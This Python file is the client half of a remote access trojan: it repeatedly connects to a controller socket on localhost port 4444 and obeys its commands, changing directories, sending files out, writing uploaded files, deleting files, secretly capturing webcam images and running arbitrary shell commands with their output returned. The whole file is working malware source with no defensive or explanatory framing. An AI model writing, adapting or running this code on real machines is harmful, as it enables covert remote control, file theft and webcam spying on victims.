import socket
import subprocess
import os
import time
import cv2

while True:
    try:
        payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload.connect(("localhost", 4444))
        # print("Connection Successfull!")
    except:
        continue
    else:
        def send_data(response):
            # use only encoded data in response argument
            data_size = len(response)
            data_size = str(data_size)
            payload.send(data_size.encode())
            time.sleep(2)  # used this to avoid network issues
            payload.send(response)


        def recv_data():
            size = payload.recv(2048).decode('utf-8')
            size = int(size)
            data = payload.recv(2048)
            while len(data) != size:
                data += payload.recv(2048)
            return data


        while True:
            try:
                cmd = payload.recv(4096)
                command = cmd.decode('utf-8')
                if command == 'quit':
                    payload.close()
                    break
                elif command[:2] == 'cd':
                    os.chdir(command[3:])
                    send_data(b'Directory changed!')
                    continue
                elif command[:8] == 'download':
                    with open(f"{command[9::]}", "rb") as data:
                        data_read = data.read()
                        data.close()
                    send_data(data_read)
                    continue
                elif command[:6] == 'upload':
                    upload_file = recv_data()
                    if upload_file == b'Error':
                        continue
                    else:
                        with open(f"{command[7:]}", "wb") as upload_data:
                            upload_data.write(upload_file)
                            upload_data.close()
                elif command[:3] == 'del':
                    subprocess.call(command, shell=True)
                    send_data(f"{command[4:]} Deleted successfully!".encode())
                elif command[:6] == 'webcam':
                    camera = cv2.VideoCapture(0)
                    success, image = camera.read()
                    if success:
                        good, final_image = cv2.imencode('.jpg', image)
                        final_image = final_image.tobytes()
                        send_data(final_image)
                    else:
                        send_data(b'Webcam not found!')
                else:
                    cmd_response = subprocess.check_output(command, shell=True)
                    send_data(cmd_response)
            except FileNotFoundError:
                send_data(b'No file or directory exist!')
            except subprocess.CalledProcessError:
                send_data(b'Command does not exist!')
            except:
                break












